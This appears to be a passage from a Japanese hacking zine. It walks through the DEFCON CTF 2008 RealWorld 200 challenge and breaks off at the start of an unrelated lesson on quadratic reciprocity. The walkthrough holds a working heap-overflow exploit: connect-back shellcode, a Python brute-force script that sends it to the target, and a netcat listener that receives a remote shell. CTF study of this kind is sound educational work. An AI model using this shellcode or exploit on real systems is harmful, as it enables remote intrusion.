+　DEFCON Capture the Flag Web site
+　http://nopsr.us/
+
+
+■0x02.) 過去問題の入手
+
+　CTFで出題された問題は、CTFのWebサイトで入手できます。2008年の問題は以下
+から入手可能です。2007年以前の問題もTOPページからたどることができます。興
+味があれば、トライしてみてください。
+
+　DEFCON CTF 2008 問題
+　http://nopsr.us/ctf2008qual/
+
+　Webサイトを見ると分かる通り、このコンテストでは様々な分野の問題が出題さ
+れます。よって、勝ち抜くためには幅広いセキュリティの知識が必要となります。
+今回は、この中から小さなヒープ領域を利用したRemote Exploiting系の問題を攻
+略します。では、RealWorld 200の問題をダウンロードしてください。
+
+　DEFCON CTF 2008 RealWorld 200
+　http://nopsr.us/ctf2008qual/realworld200-be2241fd5ac13d18c2360046dba7ed0e
+
+
+■0x03.) IDAProで逆アセンブルコードを追う
+
+　まず、ダウンロードしたファイルが何のタイプのファイルであるかを調べます。
+
+-----  terminal
+# file realworld200-be2241fd5ac13d18c2360046dba7ed0e 
+realworld200-be2241fd5ac13d18c2360046dba7ed0e: ELF 32-bit LSB executable, Intel 
+80386, version 1 (FreeBSD), for FreeBSD 6.3, dynamically linked (uses shared 
+libs), FreeBSD-style, stripped
+#
+-----
+
+　fileコマンドにより、ELF実行ファイルであり、FreeBSDで動作することが分か
+りました。実行ファイルであるため、逆アセンブルして解析します。逆アセンブ
+ルにはIDAProを使用します。
+　IDAProは商用の逆アセンブラですが、古いバージョンである「version 4.9」が
+フリーウェアとして無償公開されています。商用版と比べると機能は制限されて
+いますが、十分に有用なレベルであるため、まずはこれをダウンロードします。
+
+　IDAPro フリーウェア版
+　http://www.hex-rays.com/idapro/idadownfreeware.htm
+
+　IDAProで実行ファイルを開いたら解析が行われ、逆アセンブルコードが表示さ
+れます。まずはどのような関数が呼び出されているかを調べるため「Ctrl + F12」
+で、関数コールの連結構造をグラフ化して表示します。すると、bind、listen、
+acceptといった、一般的なサーバが呼び出す関数をコールしています。
+　サーバの場合、大抵はacceptの後にforkで子供を作り、そっちにクライアント
+との処理を委譲するため、重要な部分はacceptからforkが呼び出されている一連
+の処理です。WinGraph32（Ctrl + F12で起動されたプログラム）の関数の呼び出
+し構造の結果から、08049144の関数がacceptとforkを呼び出していることが分か
+ります。では、その関数を解析します。
+
+-----  IDAPro（08049144）
+.text:08049144 status          = dword ptr -30h
+.text:08049144 var_2C          = dword ptr -2Ch
+.text:08049144 peer            = sockaddr ptr -28h
+.text:08049144 var_14          = dword ptr -14h
+.text:08049144 var_10          = dword ptr -10h
+.text:08049144 fildes          = dword ptr -0Ch
+.text:08049144 arg_0           = dword ptr  8
+.text:08049144 arg_4           = dword ptr  0Ch
+.text:08049144
+.text:08049144                 push    ebp
+.text:08049145                 mov     ebp, esp
+.text:08049147                 sub     esp, 38h
+.text:0804914A                 mov     [ebp+var_2C], 1
+.text:08049151                 mov     [ebp+status], 0
+.text:08049158
+.text:08049158                 cmp     [ebp+var_2C], 0
+.text:0804915C                 jz      short locret_80491CF
+.text:0804915E                 sub     esp, 4
+.text:08049161                 lea     eax, [ebp+var_10]
+.text:08049164                 push    eax             ; int *
+.text:08049165                 lea     eax, [ebp+peer]
+.text:08049168                 push    eax             ; peer
+.text:08049169                 push    [ebp+arg_0]     ; int
+.text:0804916C                 call    _accept
+.text:08049171                 add     esp, 10h
+.text:08049174                 mov     [ebp+fildes], eax
+.text:08049177                 cmp     [ebp+fildes], 0FFFFFFFFh
+.text:0804917B                 jnz     short loc_804917F
+.text:0804917D                 jmp     short loc_8049158
+.text:0804917F                 call    _fork
+.text:08049184                 mov     [ebp+var_14], eax
+.text:08049187                 cmp     [ebp+var_14], 0FFFFFFFFh
+.text:0804918B                 jnz     short loc_804918F
+.text:0804918D                 jmp     short loc_8049158
+.text:0804918F                 cmp     [ebp+var_14], 0
+.text:08049193                 jnz     short loc_80491BF
+.text:08049195                 sub     esp, 0Ch
+.text:08049198                 push    [ebp+fildes]
+.text:0804919B                 mov     eax, [ebp+arg_4]
+.text:0804919E                 call    eax
+.text:080491A0                 add     esp, 10h
+.text:080491A3                 mov     [ebp+status], eax
+.text:080491A6                 sub     esp, 0Ch
+.text:080491A9                 push    [ebp+fildes]    ; fildes
+.text:080491AC                 call    _close
+.text:080491B1                 add     esp, 10h
+.text:080491B4                 sub     esp, 0Ch
+.text:080491B7                 push    [ebp+status]    ; status
+.text:080491BA                 call    _exit
+-----
+
+　forkが呼び出され、プロセスが新たに生成されたところで、「エラー処理」「
+親の処理」「子の処理」の3つに処理が分岐しているのが分かります。エラー処理
+と親の処理は関係ないため、子の処理を追います。すると、0804919Eで「call eax」
+を実行しています。そのひとつ前のmov命令で、eaxに引数の値を入れているため、
+この関数に渡される引数の場所へジャンプすることが分かります。では、もう一度
+WinGraph32を見て、関数08049144を呼び出している関数を確認します。
+　すると関数08048D44が、関数08049144を呼び出しています。
+
+-----  IDAPro（08048D44）
+.text:08048D44 var_4           = dword ptr -4
+.text:08048D44
+.text:08048D44                 push    ebp
+.text:08048D45                 mov     ebp, esp
+.text:08048D47                 sub     esp, 8
+.text:08048D4A                 and     esp, 0FFFFFFF0h
+.text:08048D4D                 mov     eax, 0
+.text:08048D52                 add     eax, 0Fh
+.text:08048D55                 add     eax, 0Fh
+.text:08048D58                 shr     eax, 4
+.text:08048D5B                 shl     eax, 4
+.text:08048D5E                 sub     esp, eax
+.text:08048D60                 mov     [ebp+var_4], 0
+.text:08048D67                 sub     esp, 0Ch
+.text:08048D6A                 push    0D10h
+.text:08048D6F                 call    sub_8048FBC
+.text:08048D74                 add     esp, 10h
+.text:08048D77                 mov     [ebp+var_4], eax
+.text:08048D7A                 sub     esp, 8
+.text:08048D7D                 push    offset sub_8048CE0
+.text:08048D82                 push    [ebp+var_4]
+.text:08048D85                 call    sub_8049144
+.text:08048D8A                 add     esp, 10h
+.text:08048D8D                 mov     eax, 0
+.text:08048D92                 leave
+.text:08048D93                 retn
+-----
+
+　アドレス08048D85で関数08049144を呼び出していますが、呼び出し前に08048C
+E0をスタックへ格納しています。よって、08048CE0以降が、fork後にeaxに格納さ
+れ呼び出される関数となります。では、eaxに格納されcallされる関数を追います。
+ここからが本番です。
+
+-----  IDAPro（08048CE0）
+.text:08048CE0
+.text:08048CE0 var_4           = dword ptr -4
+.text:08048CE0 fildes          = dword ptr  8
+.text:08048CE0
+.text:08048CE0                 push    ebp
+.text:08048CE1                 mov     ebp, esp
+.text:08048CE3                 sub     esp, 8
+.text:08048CE6                 mov     [ebp+var_4], 0
+.text:08048CED                 call    sub_8048BE0
+.text:08048CF2                 sub     esp, 8
+.text:08048CF5                 push    44h             ; size
+.text:08048CF7                 push    1               ; nmemb
+.text:08048CF9                 call    _calloc
+.text:08048CFE                 add     esp, 10h
+.text:08048D01                 mov     [ebp+var_4], eax
+.text:08048D04                 push    0Ah             ; int
+.text:08048D06                 push    44h             ; int
+.text:08048D08                 push    [ebp+var_4]     ; int
+.text:08048D0B                 push    [ebp+fildes]    ; fildes
+.text:08048D0E                 call    sub_8048E24
+.text:08048D13                 add     esp, 10h
+.text:08048D16                 push    0Ah             ; int
+.text:08048D18                 push    44h             ; int
+.text:08048D1A                 mov     eax, [ebp+var_4]
+.text:08048D1D                 add     eax, 20h
+.text:08048D20                 push    eax             ; int
+.text:08048D21                 push    [ebp+fildes]    ; fildes
+.text:08048D24                 call    sub_8048E24
+.text:08048D29                 add     esp, 10h
+.text:08048D2C                 mov     eax, [ebp+var_4]
+.text:08048D2F                 cmp     dword ptr [eax+40h], 0
+.text:08048D33                 jz      short loc_8048D3D
+.text:08048D35                 mov     eax, [ebp+var_4]
+.text:08048D38                 mov     eax, [eax+40h]
+.text:08048D3B                 call    eax
+.text:08048D3D
+.text:08048D3D                 mov     eax, 0
+.text:08048D42                 leave
+.text:08048D43                 retn
+-----
+　
+　08048CEDにて、「call sub_8048BE0」が呼び出されます。また、08048D0Eと08
+048D24にて、「call sub_8048E24」が呼び出されます。
+　では、読みやすいようにC言語のコードに変換します。
+
+-----  手動デコンパイル（8048CE0）
+int sub_8048CE0(int fd)
+{
+        unsigned char *p = 0;
+        
+        sub_8048BE0();
+        
+        p = calloc(1, 0x44);
+        
+        sub_8048E24(fd, p, 0x44, 0x0A);
+        sub_8048E24(fd, p + 0x20, 0x44, 0x0A);
+        
+        if(*((unsigned long)(p + 0x40)) != 0){
+                void (*po)() = *((unsigned long)(p + 0x40));
+                po();
+        }
+
+        return 0;
+}
+-----
+
+　同じく、呼び出されている2つの関数も逆アセンブルして、C言語にデコンパイ
+ルします。
+
+-----  IDAPro（08048BE0）
+.text:08048BE0
+.text:08048BE0 var_18          = dword ptr -18h
+.text:08048BE0 buf             = dword ptr -14h
+.text:08048BE0 var_10          = dword ptr -10h
+.text:08048BE0 var_C           = dword ptr -0Ch
+.text:08048BE0 var_8           = dword ptr -8
+.text:08048BE0 fildes          = dword ptr -4
+.text:08048BE0
+.text:08048BE0                 push    ebp
+.text:08048BE1                 mov     ebp, esp
+.text:08048BE3                 sub     esp, 18h
+.text:08048BE6                 mov     [ebp+fildes], 0
+.text:08048BED                 mov     [ebp+var_8], 0
+.text:08048BF4                 mov     [ebp+var_C], 0
+.text:08048BFB                 mov     [ebp+var_10], 0
+.text:08048C02                 mov     [ebp+buf], 0
+.text:08048C09                 sub     esp, 8
+.text:08048C0C                 push    0               ; int
+.text:08048C0E                 push    offset aDevUrandom ; "/dev/urandom"
+.text:08048C13                 call    _open
+.text:08048C18                 add     esp, 10h
+.text:08048C1B                 mov     [ebp+fildes], eax
+.text:08048C1E                 cmp     [ebp+fildes], 0FFFFFFFFh
+.text:08048C22                 jnz     short loc_8048C40
+.text:08048C24                 sub     esp, 0Ch
+.text:08048C27                 push    offset aOpenDevUrandom ; "open /dev/urandom failed!\n"
+.text:08048C2C                 call    _perror
+.text:08048C31                 add     esp, 10h
+.text:08048C34                 mov     [ebp+var_18], 0FFFFFFFFh
+.text:08048C3B                 jmp     loc_8048CDA
+.text:08048C40
+.text:08048C40                 sub     esp, 4
+.text:08048C43                 push    4               ; nbyte
+.text:08048C45                 lea     eax, [ebp+buf]
+.text:08048C48                 push    eax             ; buf
+.text:08048C49                 push    [ebp+fildes]    ; fildes
+.text:08048C4C                 call    _read
+.text:08048C51                 add     esp, 10h
+.text:08048C54                 cmp     eax, 4
+.text:08048C57                 jz      short loc_8048C72
+.text:08048C59                 sub     esp, 0Ch
+.text:08048C5C                 push    offset aReadDevUrandom ; "read /dev/urandom failed!\n"
+.text:08048C61                 call    _perror
+.text:08048C66                 add     esp, 10h
+.text:08048C69                 mov     [ebp+var_18], 0FFFFFFFFh
+.text:08048C70                 jmp     short loc_8048CDA
+.text:08048C72
+.text:08048C72                 mov     eax, [ebp+buf]
+.text:08048C75                 and     eax, 3FFh
+.text:08048C7A                 mov     [ebp+var_C], eax
+.text:08048C7D                 mov     [ebp+var_8], 0
+.text:08048C84
+.text:08048C84                 cmp     [ebp+var_8], 3FFh
+.text:08048C8B                 jg      short loc_8048CBF
+.text:08048C8D                 mov     eax, [ebp+var_8]
+.text:08048C90                 cmp     eax, [ebp+var_C]
+.text:08048C93                 jnz     short loc_8048CA9
+.text:08048C95                 sub     esp, 8
+.text:08048C98                 push    44h             ; size
+.text:08048C9A                 push    1               ; nmemb
+.text:08048C9C                 call    _calloc
+.text:08048CA1                 add     esp, 10h
+.text:08048CA4                 mov     [ebp+var_10], eax
+.text:08048CA7                 jmp     short loc_8048CB8
+.text:08048CA9
+.text:08048CA9                 sub     esp, 8
+.text:08048CAC                 push    44h             ; size
+.text:08048CAE                 push    1               ; nmemb
+.text:08048CB0                 call    _calloc
+.text:08048CB5                 add     esp, 10h
+.text:08048CB8
+.text:08048CB8                 lea     eax, [ebp+var_8]
+.text:08048CBB                 inc     dword ptr [eax]
+.text:08048CBD                 jmp     short loc_8048C84
+.text:08048CBF
+.text:08048CBF                 cmp     [ebp+var_10], 0
+.text:08048CC3                 jz      short loc_8048CD3
+.text:08048CC5                 sub     esp, 0Ch
+.text:08048CC8                 push    [ebp+var_10]    ; void *
+.text:08048CCB                 call    _free
+.text:08048CD0                 add     esp, 10h
+.text:08048CD3
+.text:08048CD3                 mov     [ebp+var_18], 0
+.text:08048CDA
+.text:08048CDA                 mov     eax, [ebp+var_18]
+.text:08048CDD                 leave
+.text:08048CDE                 retn
+.text:08048CDE sub_8048BE0     endp
+-----
+
+-----  手動デコンパイル（8048BE0）
+int sub_8048BE0(void)
+{
+        int rd, i;
+        unsigned long num;
+        unsigned char *p = NULL;
+        
+        rd = open("/dev/urandom", 0);
+        if(rd == -1){
+                perror("open /dev/urandom failed!\n");
+                return -1;
+        }
+        
+        if(read(fd, &num, 4) != 4){
+                perror("read /dev/urandom failed!\n");
+                return -1;
+        }
+        
+        num &= 0x000003FF;
+        
+        for(i=0; i <= 0x000003FF; i++){
+                if(i == num)
+                        p = calloc(1, 0x44);
+                else
+                        calloc(1, 0x44);
+        }
+        
+        if(p != NULL)
+                free(p);
+        
+        return 0;
+}
+-----
+
+　続いて08048E24です。
+
+-----  IDAPro（08048E24）
+.text:08048E24
+.text:08048E24 var_14          = dword ptr -14h
+.text:08048E24 var_10          = dword ptr -10h
+.text:08048E24 var_C           = dword ptr -0Ch
+.text:08048E24 var_8           = dword ptr -8
+.text:08048E24 var_2           = byte ptr  -2
+.text:08048E24 var_1           = byte ptr  -1
+.text:08048E24 fildes          = dword ptr  8
+.text:08048E24 arg_4           = dword ptr  0Ch
+.text:08048E24 arg_8           = dword ptr  10h
+.text:08048E24 arg_C           = dword ptr  14h
+.text:08048E24
+.text:08048E24                 push    ebp
+.text:08048E25                 mov     ebp, esp
+.text:08048E27                 sub     esp, 18h
+.text:08048E2A                 mov     eax, [ebp+arg_C]
+.text:08048E2D                 mov     [ebp+var_1], al
+.text:08048E30                 mov     eax, [ebp+arg_4]
+.text:08048E33                 mov     [ebp+var_8], eax
+.text:08048E36                 mov     [ebp+var_C], 0
+.text:08048E3D                 mov     [ebp+var_10], 0
+.text:08048E44
+.text:08048E44                 sub     esp, 4
+.text:08048E47                 push    1               ; nbyte
+.text:08048E49                 lea     eax, [ebp-2]
+.text:08048E4C                 push    eax             ; buf
+.text:08048E4D                 push    [ebp+fildes]    ; fildes
+.text:08048E50                 call    _read
+.text:08048E55                 add     esp, 10h
+.text:08048E58                 mov     [ebp+var_C], eax
+.text:08048E5B                 cmp     [ebp+var_C], 0
+.text:08048E5F                 jg      short loc_8048E6A
+.text:08048E61                 mov     [ebp+var_14], 0FFFFFFFFh
+.text:08048E68                 jmp     short loc_8048EA3
+.text:08048E6A
+.text:08048E6A                 movzx   edx, [ebp+var_2]
+.text:08048E6E                 movsx   eax, [ebp+var_1]
+.text:08048E72                 cmp     edx, eax
+.text:08048E74                 jnz     short loc_8048E7E
+.text:08048E76                 mov     eax, [ebp+var_10]
+.text:08048E79                 mov     [ebp+var_14], eax
+.text:08048E7C                 jmp     short loc_8048EA3
+.text:08048E7E
+.text:08048E7E                 mov     eax, [ebp+var_10]
+.text:08048E81                 cmp     eax, [ebp+arg_8]
+.text:08048E84                 jl      short loc_8048E8F
+.text:08048E86                 mov     [ebp+var_14], 0FFFFFFFFh
+.text:08048E8D                 jmp     short loc_8048EA3
+.text:08048E8F
+.text:08048E8F                 mov     eax, [ebp+var_10]
+.text:08048E92                 mov     edx, eax
+.text:08048E94                 add     edx, [ebp+var_8]
+.text:08048E97                 mov     al, [ebp+var_2]
+.text:08048E9A                 mov     [edx], al
+.text:08048E9C                 lea     eax, [ebp+var_10]
+.text:08048E9F                 inc     dword ptr [eax]
+.text:08048EA1                 jmp     short loc_8048E44
+.text:08048EA3
+.text:08048EA3                 mov     eax, [ebp+var_14]
+.text:08048EA6                 leave
+.text:08048EA7                 retn
+-----
+
+-----  手動デコンパイル（8048E24）
+int sub_8048E24(int fd, unsigned char *buff, int size, int crlf)
+{
+        int s = 0;
+        char lf, c;
+        
+        lf = (char)(ctlf & 0xFF);
+        
+        while(1){
+                int ret = read(fd, &c, 1);
+                if(ret == 0)
+                        return -1;
+                if(c == lf)
+                        return s;
+                if(s >= size)
+                        return -1;
+                *(buff + s) = (unsigned char)c & 0xFF;
+                s++;
+        }
+        
+        return 0;
+}
+-----
+
+　行き当たりばったりの手動デコンパイルなので、少々コードが汚い（かつ間違
+いがありそう）ですが、動作原理を知る上はおそらく問題ないと思います。本来
+ならば逆アセンブルされたコードを読みながら脆弱な部分を探すことになります
+が、今回は分かりやすくC言語に書き直しました。このコードを見て、どういった
+仕組みになっているかを解析します。
+　まず、sub_8048CE0から最初に呼び出されているsub_8048BE0ですが、これは、
+何をしている関数でしょうか？　実はこれは、callocで確保した領域のアドレス
+をランダムな値にするための処理です。0x0400回だけcallocを呼び出しており、
+その中からランダムでひとつだけ選び、freeで解放します。その状態で関数を終
+了させ、呼び出し元のsub_8048CE0へ戻ると、戻った先では、再度callocが呼び出
+されます。このとき、sub_8048BE0内でランダム値によって選ばれ、freeで解放さ
+れた場所が、再度メモリ領域として割り当てられます。つまり、結果的に、0x04
+00パターンのアドレス値の中からランダムに選ばれたメモリ領域が、sub_8048E2
+4も含めた以降の処理で使われます。
+　では、sub_8048E24は何をやっている関数かというと、これは引数に「ファイル
+ハンドル」「保存バッファ」「最大サイズ」「終端文字」の4つを渡し、ファイル
+ハンドルから、「最大サイズになるか」あるいは「終端文字が見つかる」まで、
+保存バッファへデータを書き出す処理を行います。
+　これらを踏まえて、もう一度sub_8048CE0の処理と問題部分を考えます。まず、
+ランダムなアドレスではありますが、callocでメモリが0x44バイト確保され、そ
+の0x44バイトの領域に「終端文字'\n'が見つかるまで」クライアントから送られ
+たデータをコピーします。次に再度、今度はcallocで確保された先頭メモリアド
+レス+0x20から、同じく「終端文字'\n'が見つかるまで」クライアントから送られ
+たデータをコピーします。ちなみに、ここで0x44バイトしか確保していない領域
+に対して、+0x20の場所から0x44バイト（つまり0x64バイト）データをコピーして
+いるため、ヒープオーバーフローが発生しています。そして、最後に、+0x40から
+の4バイト値へcall命令によりジャンプしているため、ここで、任意のコードを実
+行させるためのジャンプ先アドレスを指定できます。
+　これらをまとめると、以下のメモリマップになります。
+
+  <------------- calloc -------------->
+  +----| |------+----------------+----------------+----------------+----+
+  |    | |      |                |ADDR            |                |    |
+  +----| |------+----------------+----------------+----------------+----+
+ 0x00          0x30             0x40             0x50             0x60 0x64
+
+　さて、ADDRにはshellcodeへのアドレスを入れる必要があるため、実質、0x40バ
+イトしか自由に書き換えできるメモリ領域はありません。つまり、0x40バイト以
+下のリモート用shellcodeを用意する必要があります。もしくは、ADDRの前にjmp
+命令を置き、ADDR分（4バイト）を飛ばすことで、最大0x64（ADDRとjmpを省くと
+0x5E）分、shellcode用に使用できます。
+　つまり、第一の問題は、0x40もしくは0x64バイトに収まるリモート用のshellc
+odeを用意する必要があるということ、そして第二の問題は、この領域がcallocに
+よってランダムに決定された領域であるため、アドレスを決め打ちできないとい
+うこと、この2つが解決すべき壁となります。ちなみに解決策は1つではありませ
+ん。解く方法はいくつもありますので、自分で考えてみるのもよいでしょう。
+
+
+■0x04.) アドレス推測とshellcodeの作成
+
+　callocによりランダムに決定される領域のアドレスを100%当てるのは不可能で
+すが、この問題は、callocを0x0400回呼び出して、その中からひとつランダムに
+選んでいるため、0x0400回（1024回）試行すれば、確率的には1回は当たります。
+つまり、exploitをブルートフォース的に投げていけば、それなりの確率でヒット
+します。
+　calloc関数をフックして、アドレスの候補を列挙します。
+
+-----  calloc_hook.c
+#define _GNU_SOURCE
+#include <dlfcn.h>
+#include <stdlib.h>
+#include <stdio.h>
+ 
+static void * (*calloc0)(size_t nmemb, size_t size);
+ 
+void __attribute__((constructor))
+init_calloc0()
+{
+        calloc0 = dlsym(RTLD_NEXT, "calloc");
+}
+ 
+void * calloc(size_t nmemb, size_t size)
+{
+        void *p = (*calloc0)(nmemb, size);
+        fprintf(stderr, "%08X\n", (unsigned long)p);
+        return p;
+}
+-----
+
+　calloc関数をフックした状態で、プログラムを実行します。
+
+-----  freebsd terminal
+# gcc -shared -fPIC -o calloc_hook.so calloc_hook.c -dl
+# setenv LD_PRELOAD ./calloc_hook.so
+# chmod 755 realworld200-be2241fd5ac13d18c2360046dba7ed0e
+# ./realworld200-be2241fd5ac13d18c2360046dba7ed0e
+-----
+
+　実行するとポート3344で接続待ち状態になるので、別のマシンからconnectしま
+す。
+
+-----  attack terminal
+# nc 10.81.45.21 3344
+-----
+
+　connectすると、calloc関数が1024回呼び出されます。そして、関数フックによ
+り、callocの戻り値が出力されます。
+
+-----  freebsd terminal
+# ./realworld200-be2241fd5ac13d18c2360046dba7ed0e
+0804C000
+0804C080
+0804C100
+0804C180
+.....
+......
+0806BE80
+0806BF00
+0806BF80
+08053800
+-----
+
+　この中から好きなアドレスを選び、決め打ちします。決め打ちにしたとしても、
+1024回試行すれば、1回は成功する確率なので、ここはブルートフォースで攻略し
+ます。
+
+　次にshellcodeの問題ですが、今回はサイズが膨大にあるわけではないため、そ
+の点を若干考慮して作成します。
+
+-----  shellcode.s
+.globl main
+
+main:
+        push       $0x61
+        pop        %eax
+        cdq
+        push       %edx
+        inc        %edx
+        push       %edx
+        inc        %edx
+        push       %edx
+        push       $0x152D5156
+        int        $0x80
+        push       $0x611E0210
+        mov        %esp, %ecx
+        push       $0x10
+        push       %ecx
+        push       %eax
+        push       %ecx
+        xchg       %edi, %eax
+        push       $0x62
+        pop        %eax
+        int        $0x80
+L1:     mov        $0x5A, %al
+        push       %edx
+        push       %edi
+        push       %edx
+        int        $0x80
+        dec        %edx
+        jns        L1
+        push       $0x0068732F
+        push       $0x6E69622F
+        mov        %esp, %ebx
+        push       %eax
+        push       %esp
+        push       %ebx
+        push       %ebx
+        mov        $0x3B, %al
+        int        $0x80
+        .string "ADDR"
+-----
+
+　アセンブラで書いて、マシン語に変換します。
+
+-----  freebsd terminal
+# gcc shellcode.s -o shellcode
+# objdump -d shellcode | grep \<main\> -A 42
+
+080483c4 <main>:
+ 80483c4:        6a 61                        push   $0x61
+ 80483c6:        58                           pop    %eax
+ 80483c7:        99                           cltd   
+ 80483c8:        52                           push   %edx
+ 80483c9:        42                           inc    %edx
+ 80483ca:        52                           push   %edx
+ 80483cb:        42                           inc    %edx
+ 80483cc:        52                           push   %edx
+ 80483cd:        68 56 51 2d 15               push   $0x152d5156
+ 80483d2:        cd 80                        int    $0x80
+ 80483d4:        68 10 02 1e 61               push   $0x611e0210
+ 80483d9:        89 e1                        mov    %esp,%ecx
+ 80483db:        6a 10                        push   $0x10
+ 80483dd:        51                           push   %ecx
+ 80483de:        50                           push   %eax
+ 80483df:        51                           push   %ecx
+ 80483e0:        97                           xchg   %eax,%edi
+ 80483e1:        6a 62                        push   $0x62
+ 80483e3:        58                           pop    %eax
+ 80483e4:        cd 80                        int    $0x80
+
+080483e6 <L1>:
+ 80483e6:        b0 5a                        mov    $0x5a,%al
+ 80483e8:        52                           push   %edx
+ 80483e9:        57                           push   %edi
+ 80483ea:        52                           push   %edx
+ 80483eb:        cd 80                        int    $0x80
+ 80483ed:        4a                           dec    %edx
+ 80483ee:        79 f6                        jns    80483e6 <L1>
+ 80483f0:        68 2f 73 68 00               push   $0x68732f
+ 80483f5:        68 2f 62 69 6e               push   $0x6e69622f
+ 80483fa:        89 e3                        mov    %esp,%ebx
+ 80483fc:        50                           push   %eax
+ 80483fd:        54                           push   %esp
+ 80483fe:        53                           push   %ebx
+ 80483ff:        53                           push   %ebx
+ 8048400:        b0 3b                        mov    $0x3b,%al
+ 8048402:        cd 80                        int    $0x80
+ 8048404:        41                           inc    %ecx
+ 8048405:        44                           inc    %esp
+ 8048406:        44                           inc    %esp
+ 8048407:        52                           push   %edx
+-----
+
+　shellcodeを元にexploitを作成します。
+
+-----  exploit200.py
+#!/usr/bin/python
+from socket import *
+
+if __name__ == "__main__":
+
+        for i in range(100):
+
+                s = socket()
+                s.connect(('10.81.45.21', 3344))
+
+                shellcode = "\x6a\x61\x58\x99\x52\x42\x52\x42\x52\x68"
+                shellcode += "\x56\x51\x2d\x15" ## REMOTE ADDR
+                shellcode += "\xcd\x80\x68"
+                shellcode += "\x10\x02\x1e\x61" ## REMOTE PORT
+                shellcode += "\x89\xe1\x6a\x10\x51\x50\x51\x97"
+                shellcode += "\x6a\x62\x58"
+
+                s.send(shellcode + '\n')
+
+                shellcode = "\xcd\x80\xb0\x5a\x52"
+                shellcode += "\x57\x52\xcd\x80\x4a\x79\xf6"
+                shellcode += "\x68\x2f\x73\x68\x00\x68\x2f\x62"
+                shellcode += "\x69\x6e\x89\xe3\x50\x54\x53\x53"
+                shellcode += "\xb0\x3b\xcd\x80"
+                shellcode += "\x80\xbb\x06\x08" ## RET ADDRESS
+
+                s.send(shellcode + '\n')
+                s.close
+-----
+
+　今回作成したshellcodeは、socketを開き、connect関数を呼び出して任意のサ
+ーバへコネクションを行うものです。「REMOTE ADDR」の4バイトにサーバのIPア
+ドレスを、同じく「REMOTE PORT」の下位2バイトにサーバのポートを指定します。
+そして「RET ADDRESS」には、推測したメモリアドレス（callocの戻り値）を設定
+します。
+　リモート環境を対象としたアタックでは、bind、listen、acceptを行い、外部
+から接続を待ち受ける「bind型」のshellcodeも良く使われますが、今回はshell
+codeを置けるメモリ領域が少なかったため（0x40バイト）このようなshellcodeに
+しました。よって、こちら側で待ち受け用のサーバも用意します。待ち受け用の
+サーバには、netcatを使います。
+
+-----  attack terminal
+# nc -l 7777
+-----
+
+　続いて、ターゲットとなるマシンで、realworld200プログラムを起動します。
+
+-----  target terminal
+# ./realworld200-be2241fd5ac13d18c2360046dba7ed0e
+-----
+
+　そして、ターゲットマシンのポート3344（realworld200プログラムが利用する
+ポート）へ、exploitを送信します。
+
+-----  attack terminal
+# python exploit200.py
+-----
+
+　あとは確率の問題ですが、アドレスがcallocで得られるアドレス範囲にマッチ
+していれば、300～400回で（要するにexploit200.pyを3～4回実行すれば）攻撃は
+成功します。攻撃が成功したら、netcatから、targetマシンが奪えます。
+
+-----  attack terminal
+# nc -l 7777
+ls（コマンドが通る）
+.cshrc
+.login
+.login_conf
+.mail_aliases
+.mailrc
+.profile
+.rhosts
+.shrc
+realworld200-be2241.core
+realworld200-be2241fd5ac13d18c2360046dba7ed0e
+key（パスワード発見！）
+-----
+
+　以上で攻略完了です。いかがだったでしょうか？　この問題の特徴は、乱数を
+用いてアドレスを推測できないようにしている点、そして、微妙に小さい（が、
+shellcodeが埋め込められないレベルでは決してない程度の）メモリ領域、の2点
+がなかなか面白いところだったと思います。
+
+
+■0x05.) 別の攻撃方法
+
+　この問題には、模範解答がありません。考えればまだまだ様々な方法が見つけ
+られると思います。例えば、今回は0x40バイトに無理矢理shellcodeを押し込みま
+したが、jmp命令を使って「RET ADDRESS」を飛ばすようにすれば、もう少し多く
+のメモリ領域をshellcode置き場として使用できます。さらに、shellcode内でも
+う一度、広いアドレス領域を指定してsub_08048E24関数を呼び出せば、攻撃者の
+思いのままのサイズのshellcode用領域が用意できます。なにせこの問題プログラ
+ムの内部には、1023×0x44バイトの何も使っていない領域があるわけですから。
+　また、この問題に興味があれば、DEFCON CTF 2008年の「Potent Pwnables 200」
+の問題を解いてみるのもよいと思います。
+
+
+■0x06.) さいごに
+
+　今回はハッキングコンテスト「DEFCON CTF 2008」の問題解説をやりましたが、
+いかがだったでしょうか？　この大会は毎年6月上旬ごろに予選が行われており、
+その予選に勝ち残った（約）7組が決勝戦をラスベガスで行い、TOPを決めます。
+世界中のセキュリティエンジニアが参加していますので、やはりレベルは高いで
+すし、純粋なセキュリティの問題だけではなく、パズル的なものや数学的なもの
+まで幅広い問題があります。予選はリモートで、Webでアカウント登録するだけで
+参加できるので、もし興味があれば、来年2009年のCTFに挑戦してみても楽しいか
+もしれません。
+　また、日本でも有志を集めて「CTF勉強会」（http://ja.avtokyo.org/projects）
+というイベントを月1回開催しています。こちらも興味があれば参加してみてはど
+うでしょうか。
+
+　さて、そんなところで、今年も残りわずかとなりました。今年は個人的には怒
+濤のような1年でしたが、振り返ってみると楽しい思い出です。来年も、振り返っ
+てみて楽しかったなと思える1年にしたいと思います。では、また来年お会いしま
+しょう。
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第5章: 基礎暗号学講座・第19回 ～平方剰余の相互法則～ ---
+
+著者：IPUSIRON
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) はじめに
+
+　前回のWB43ではルジャンドル記号とその性質について触れた。
+　今回は平方剰余(a/p)を計算するために便利な道具として、補充法則と相互法則
+を紹介する。
+
+
+■0x02.) ガウスの補題
+
+　いきなり定理を記述するのではなく、数値例で観察してみる。
+
+　p=11,a=7とする。aの1倍から5倍（=(p-1)/2=10/2)までの数列を作る。
+
+a×1, a×2, a×3, a×4, a×5
+
+↓
+
+7×1, 7×2, 7×3, 7×4, 7×5
+
+↓
+
+7, 14, 21, 28, 35
+
+↓mod pを取る
+
+7, 3, 10, 6, 2
+
+↓p/2=11/2=5.5より大きい数から11を引く。即ち、マイナスで表記する。
+
+-4, 3, -1, -5, 2	←この数列を絶対値最小剰余と呼ぶ。
+
+↓マイナス符号を取り除く。
+
